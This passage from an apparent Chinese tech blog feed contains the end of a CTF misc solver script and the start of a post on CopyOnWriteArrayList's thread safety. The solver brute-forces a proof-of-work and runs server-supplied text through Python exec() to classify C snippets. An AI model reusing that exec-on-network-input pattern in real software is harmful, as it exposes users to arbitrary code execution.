class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 设置目标服务器的IP地址和端口</span></span><br><span class="line">ip_address = <span class="string">&quot;47.98.209.191&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的套接字（socket）</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标服务器</span></span><br><span class="line">s.connect((ip_address, port))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line">resp = data.decode()</span><br><span class="line">matchs1 = re.match(<span class="string">r&quot;sha256\(XXX(.*?)\)&quot;</span>, resp)</span><br><span class="line">code1 = matchs1.group(<span class="number">1</span>).split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">code2 = resp.split(<span class="string">&quot;==&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code1 : &quot;</span> + code1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;code2 : &quot;</span> + code2)</span><br><span class="line"><span class="comment"># 服务器提供的信息</span></span><br><span class="line">target_hash = code2</span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(code1)</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re,os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NonNegativeIndexList</span>(<span class="title class_ inherited__">list</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__getitem__(index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, index, value</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">int</span>) <span class="keyword">and</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> IndexError(<span class="string">&quot;Index cannot be negative&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__setitem__(index, value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">c_to_python_syntax</span>(<span class="params">c_code</span>):</span><br><span class="line">    array_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\[([\sa-zA-Z0-9_+]*)\](?:\s*\[([\sa-zA-Z0-9_+]*)\])?;&quot;</span></span><br><span class="line">    assignment_pattern = <span class="string">r&quot;int\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*([0-9]+);&quot;</span></span><br><span class="line"></span><br><span class="line">    array_match = re.match(array_pattern, c_code)</span><br><span class="line">    assignment_match = re.match(assignment_pattern, c_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> array_match:</span><br><span class="line">        var_name = array_match.group(<span class="number">1</span>)</span><br><span class="line">        first_dim = array_match.group(<span class="number">2</span>)</span><br><span class="line">        second_dim = array_match.group(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> second_dim:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([[None]*(<span class="subst">&#123;second_dim&#125;</span>)]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = NonNegativeIndexList([None]*(<span class="subst">&#123;first_dim&#125;</span>))&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> assignment_match:</span><br><span class="line">        var_name = assignment_match.group(<span class="number">1</span>)</span><br><span class="line">        value = assignment_match.group(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span> = <span class="subst">&#123;value&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid C code provided&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code_lines = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> code_line <span class="keyword">in</span> code_lines:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(code_line.find(<span class="string">&quot;int&quot;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span>(code_line.find(<span class="string">&quot;[&quot;</span>)!= -<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(c_to_python_syntax(code_line))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span>(code_line.find(<span class="string">&#x27;=&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">exec</span>(code_line.replace(<span class="string">&#x27;int &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)+<span class="string">&#x27;=None&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">exec</span>(code_line) <span class="comment">#TypeError(未初始化)   IndexError（越界）   </span></span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span>(e.args[<span class="number">0</span>].find(<span class="string">&#x27;list indices must be integers or slices&#x27;</span>)!=-<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;boo&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;noboo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ifboo</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    code = patch(<span class="built_in">input</span>) <span class="comment">#补全代码</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prfint</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    input_lists = <span class="built_in">input</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    new_code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> input_list <span class="keyword">in</span> input_lists:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(input_list[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                new_code += input_list+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> new_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有可能的 XXX 值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** <span class="number">6</span>):</span><br><span class="line">    <span class="comment"># 将 i 转换成 16 进制字符串，左侧填充 0 到 6 位</span></span><br><span class="line">    xxx_hex = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算哈希值</span></span><br><span class="line">    input_str = <span class="built_in">bytes</span>.fromhex(xxx_hex) + salt</span><br><span class="line">    hash_obj = hashlib.sha256(input_str)</span><br><span class="line">    hash_hex = hash_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果哈希值匹配，则打印 XXX 值并退出循环</span></span><br><span class="line">    <span class="keyword">if</span> hash_hex == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found XXX: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(xxx_hex))</span><br><span class="line">        code = xxx_hex</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">s.sendall(code.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 接收来自服务器的数据（设定接收数据的最大字节数为1024）</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;TIMETIMETIME:::::&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">input</span> = data.decode() <span class="comment">#Your answer (safeb/unknown):</span></span><br><span class="line">        input_code = prfint(<span class="built_in">input</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        </span><br><span class="line">        boo = ifboo(input_code.replace(<span class="string">&#x27;[ &#x27;</span>,<span class="string">&#x27;[&#x27;</span>).replace(<span class="string">&#x27; ]&#x27;</span>,<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span>(boo==<span class="string">&#x27;boo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;noboo&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;safe&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;safe\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span>(boo==<span class="string">&#x27;unknown&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;unknown\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;oob&#x27;</span>)</span><br><span class="line">            s.sendall(<span class="string">b&#x27;oob\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        data = s.recv(<span class="number">2048</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Received:&quot;</span>, data.decode())</span><br><span class="line">        <span class="comment"># 发送用户输入的数据到服务器</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 关闭套接字</span></span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>网上都是转成lark语法，我是转成了python语法，然后重载了列表，让他如果index&lt;0了，就触发异常，满足c语言的语法，然后根据不同的异常信息去判断结果</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ezBean&quot;&gt;&lt;a href=&quot;#ezBean&quot; class=&quot;headerlink&quot; title=&quot;ezBean&quot;&gt;&lt;/a&gt;ezBean&lt;/h2&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="misc" scheme="http://example.com/tags/misc/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CopyOnWriteArrayList解析</title>
    <link href="http://example.com/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2023/04/19/CopyOnWriteArrayList%E8%A7%A3%E6%9E%90/</id>
    <published>2023-04-19T12:40:14.000Z</published>
    <updated>2023-08-27T13:00:06.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这两个月不知道干嘛，学工具又不想学，就开始研究tomcat的源码。<br><span id="more"></span><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生命周期监听器保存在一个线程安全的CopyOnWriteArrayList中</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> List&lt;LifecycleListener&gt; lifecycleListeners = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.add(listener);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> LifecycleListener[] findLifecycleListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> lifecycleListeners.toArray(<span class="keyword">new</span> <span class="title class_">LifecycleListener</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeLifecycleListener</span><span class="params">(LifecycleListener listener)</span> &#123;</span><br><span class="line">    lifecycleListeners.remove(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>好奇为什么CopyOnWriteArrayList可以实现线程安全，本篇就浅析一下为什么他可以实现线程安全</p><h2 id="普通ArrayList"><a href="#普通ArrayList" class="headerlink" title="普通ArrayList"></a>普通ArrayList</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"></span><br><span class="line"><span class="comment">//我当前正在迭代集合（这里模拟并发中读取某一list的场景）</span></span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"></span><br><span class="line">System.err.println(iter.next());</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序如果在单线程执行是没什么问题的，但是如果到了多线程，那么就会因为add（写操作）和next（读操作）同时进行，而引发异常<br>下面的代码就是会抛出异常的代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">list.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">Iterator&lt;String&gt; iter = list.iterator();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存放10个线程的线程池</span></span><br><span class="line"><span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行10个任务(我当前正在迭代集合（这里模拟并发中读取某一list的场景）)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">System.err.println(iter.next());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行10个任务</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">service.execute(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">list.add(<span class="string">&quot;121&quot;</span>);<span class="comment">// 添加数据</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.err.println(Arrays.toString(list.toArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>如下是ArrayList的next()代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">    Object[] elementData = ArrayList.<span class="built_in">this</span>.elementData;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    cursor = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在next()中<br><code>Object[] elementData = ArrayList.this.elementData;</code><br>触发了elementData的读取操作</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>如下是ArrayList的add()代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    checkForComodification();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> cursor;</span><br><span class="line">        ArrayList.<span class="built_in">this</span>.add(i, e);</span><br><span class="line">        cursor = i + <span class="number">1</span>;</span><br><span class="line">        lastRet = -<span class="number">1</span>;</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">    rangeCheckForAdd(index);</span><br><span class="line"></span><br><span class="line">    ensureCapacityInternal(size + <span class="number">1</span>);  <span class="comment">// Increments modCount!!</span></span><br><span class="line">    System.arraycopy(elementData, index, elementData, index + <span class="number">1</span>,</span><br><span class="line">                        size - index);</span><br><span class="line">    elementData[index] = element;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在add()中<br><code>ArrayList.this.add(i, e);</code><br>触发了elementData的写操作</p><h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><p>那么看看CopyOnWriteArrayList是如何实现add的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到add操作进行了加锁，并且生成了一个新的数组，把旧的列表复制到新列表中<br>在这触发了elements的读取写入操作</p><h2 id="next-1"><a href="#next-1" class="headerlink" title="next"></a>next</h2><p>再来看看如何进行next操作的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span 